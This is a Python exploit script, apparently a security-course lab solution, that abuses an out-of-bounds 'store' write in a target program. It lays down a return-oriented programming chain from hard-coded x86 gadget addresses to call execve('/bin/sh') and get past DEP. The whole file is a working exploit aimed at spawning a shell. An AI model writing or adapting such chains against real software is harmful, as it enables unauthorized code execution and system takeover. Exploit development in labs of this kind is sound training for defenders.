# lab5end: byp4ss1ng_d3p_1s_c00l_am1rite

import os
import sys
import subprocess

INDEX = 1073741711+3 # return address &quit -> 1073741711

def rop_gadget_write(gadget, stack_adjustment):

  global INDEX

  # we cannot write to addresses that equal 0 when % by 3
  while (INDEX % 3 == 0):
    INDEX -= 1

  sys.stderr.write("[+] Gadget written at 0x%8x\n" % INDEX)

  # write the gadget / operation we need to do
  write_gadget  = "store\n"             # trigger the out of bounds write
  write_gadget += "%d\n" % (gadget)     # <gadget / address>
  write_gadget += "-%d\n" % (INDEX)     # write at index[x]
  INDEX -= 1

  # move the stack pointer to the next gadget
  if stack_adjustment != 0x00000000:
    write_gadget += "store\n"
    write_gadget += "%d\n" % (stack_adjustment)
    write_gadget += "-%d\n" % (INDEX)
    INDEX -= 1

  sys.stdout.write(write_gadget)

def trigger_vuln():

  trigger  = "quit"
  trigger += "\n\n"

  sys.stdout.write(trigger)

def exploit_buffer():

  # EAX == execve(
  #   (EBX) const char *pathname = pointer to "/bin/sh",
  #   (ECX) char *const argv[] = NULL,
  #   (EDX) char *const envp[] = NULL
  # );
  #
  # generate a pointer to "/bin/sh", into EBX
  rop_gadget_write(0x6e69622f, 0x0068732f) # "/bin/sh"
  rop_gadget_write(0x08054c32, # ret;
                   0x08099179) # pop ebx; ret;                (1. place a stack address in EBX)
  rop_gadget_write(0x08054c32, # ret;
                   0x0804fc82) # mov eax, ebx; pop ebx; ret;
  rop_gadget_write(0x080640f8, # sub eax, edx; ret;           (2. EAX - (EDX == 0x74))
                   0x0809684b) # sub eax, 0x10; pop edi; ret; (3. EAX - 0x10)
  rop_gadget_write(0x08054c32, # ret;
                   0x0809684b) # sub eax, 0x10; pop edi; ret; (4. EAX - 0x10, EAX -> "/bin/sh")
  rop_gadget_write(0x0804846e, # pop esi; pop edi; ret;
                   0x08054c32) # <fill ESI with readable address>
  rop_gadget_write(0x080e4a45, # xchg eax, ebx; or cl, byte ptr [esi]; adc al, 0x41; ret;
                   0x0806c0a9) # add esp, 4; ret;
  # generate the syscall number for execve(11) into EAX
  rop_gadget_write(0x08054c30, # xor eax, eax; ret;
                   0x08096be2) # add eax, 0xb; pop edi; ret;
  # place a NULL into the ECX register
  rop_gadget_write(0x08054c32, # ret
                   0x080e6255) # pop ecx; ret;
  # place a NULL into the EDX register and make the syscall
  rop_gadget_write(0x08054c32, # ret
                   0x0806f3aa) # pop edx; ret;
  rop_gadget_write(0x080e7357, # dec edx; ret;
                   0x08048eaa) # int 0x80

  trigger_vuln()

def main():
  exploit_buffer()

main()
